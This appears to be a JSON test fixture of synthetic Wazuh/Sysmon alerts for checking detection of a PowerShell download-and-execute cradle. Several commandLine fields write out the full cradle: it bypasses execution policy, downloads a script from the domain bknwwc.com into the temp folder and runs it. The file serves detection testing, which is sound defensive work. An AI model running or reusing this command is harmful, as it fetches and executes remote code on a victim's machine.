@@ -1,0 +1,378 @@
+{
+  "_metadata": {
+    "attack_id": "T1059.001",
+    "variation": "001",
+    "name": "PowerShell Download-and-Execute Cradle",
+    "description": "PowerShell downloading script via iwr and executing from temp directory with execution policy bypass",
+    "expected_detection": "CRITICAL",
+    "kill_chain_phase": "execution",
+    "references": [
+      "PookaSec incident 2026-02-03"
+    ],
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Start-Process PowerShell with download cradle",
+      "sequence": 1,
+      "timestamp": "2026-02-03T17:00:00.000Z",
+      "log": {
+        "timestamp": "2026-02-03T17:00:00.000+0000",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: PowerShell download-and-execute cradle",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1059.001",
+              "T1105"
+            ],
+            "tactic": [
+              "Execution",
+              "Command and Control"
+            ],
+            "technique": [
+              "PowerShell",
+              "Ingress Tool Transfer"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows",
+            "powershell",
+            "malware"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706979600.100001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 17:00:00.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789400}",
+              "processId": "21000",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "Start-Process PowerShell -Args '-ep Bypass -c &{iwr https://bknwwc.com -OutFile $env:TEMP\\tt.ps1 -UseBasicParsing;& $env:TEMP\\tt.ps1}'",
+              "currentDirectory": "C:\\Users\\victim\\",
+              "user": "CORP\\victim",
+              "integrityLevel": "Medium",
+              "parentImage": "C:\\Windows\\explorer.exe",
+              "parentCommandLine": "C:\\Windows\\explorer.exe"
+            }
+          }
+        },
+        "_fomorian_batch": "download-execute-cradle",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.001",
+        "_fomorian_technique": "iwr-download-execute"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Child PowerShell process executing the cradle",
+      "sequence": 2,
+      "timestamp": "2026-02-03T17:00:01.000Z",
+      "log": {
+        "timestamp": "2026-02-03T17:00:01.000+0000",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: PowerShell execution policy bypass with download",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1059.001",
+              "T1105"
+            ],
+            "tactic": [
+              "Execution",
+              "Command and Control"
+            ],
+            "technique": [
+              "PowerShell",
+              "Ingress Tool Transfer"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows",
+            "powershell",
+            "malware"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706979601.100002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 17:00:01.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789401}",
+              "processId": "21100",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ep Bypass -c &{iwr https://bknwwc.com -OutFile $env:TEMP\\tt.ps1 -UseBasicParsing;& $env:TEMP\\tt.ps1}",
+              "currentDirectory": "C:\\Users\\victim\\",
+              "user": "CORP\\victim",
+              "integrityLevel": "Medium",
+              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "parentCommandLine": "Start-Process PowerShell -Args '-ep Bypass -c &{iwr https://bknwwc.com -OutFile $env:TEMP\\tt.ps1 -UseBasicParsing;& $env:TEMP\\tt.ps1}'"
+            }
+          }
+        },
+        "_fomorian_batch": "download-execute-cradle",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.001",
+        "_fomorian_technique": "iwr-download-execute-child"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 22 - DNS query to malicious domain",
+      "sequence": 3,
+      "timestamp": "2026-02-03T17:00:02.000Z",
+      "log": {
+        "timestamp": "2026-02-03T17:00:02.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 22: DNS query to suspicious domain",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1071.001"
+            ],
+            "tactic": [
+              "Command and Control"
+            ],
+            "technique": [
+              "Web Protocols"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event_22",
+            "windows",
+            "dns"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706979602.100003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "22",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 17:00:02.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789401}",
+              "processId": "21100",
+              "queryName": "bknwwc.com",
+              "queryStatus": "0",
+              "queryResults": "185.199.108.153",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "user": "CORP\\victim"
+            }
+          }
+        },
+        "_fomorian_batch": "download-execute-cradle",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1071.001",
+        "_fomorian_technique": "dns-phishing-domain"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - Network connection to malicious domain",
+      "sequence": 4,
+      "timestamp": "2026-02-03T17:00:03.000Z",
+      "log": {
+        "timestamp": "2026-02-03T17:00:03.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 3: PowerShell network connection",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1071.001",
+              "T1105"
+            ],
+            "tactic": [
+              "Command and Control"
+            ],
+            "technique": [
+              "Web Protocols",
+              "Ingress Tool Transfer"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event_3",
+            "windows",
+            "network"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706979603.100004",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 17:00:03.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789401}",
+              "processId": "21100",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "user": "CORP\\victim",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "198.51.100.20",
+              "sourcePort": "54321",
+              "destinationIp": "185.199.108.153",
+              "destinationHostname": "bknwwc.com",
+              "destinationPort": "443"
+            }
+          }
+        },
+        "_fomorian_batch": "download-execute-cradle",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1105",
+        "_fomorian_technique": "network-download"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 11 - Malicious script written to temp",
+      "sequence": 5,
+      "timestamp": "2026-02-03T17:00:04.000Z",
+      "log": {
+        "timestamp": "2026-02-03T17:00:04.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 11: Script file created in temp",
+          "id": "100925",
+          "mitre": {
+            "id": [
+              "T1105"
+            ],
+            "tactic": [
+              "Command and Control"
+            ],
+            "technique": [
+              "Ingress Tool Transfer"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706979604.100005",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 17:00:04.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789401}",
+              "processId": "21100",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "targetFilename": "C:\\Users\\victim\\AppData\\Local\\Temp\\tt.ps1",
+              "creationUtcTime": "2026-02-03 17:00:04.000",
+              "user": "CORP\\victim"
+            }
+          }
+        },
+        "_fomorian_batch": "download-execute-cradle",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1105",
+        "_fomorian_technique": "script-drop-temp"
+      }
+    }
+  ]
+}
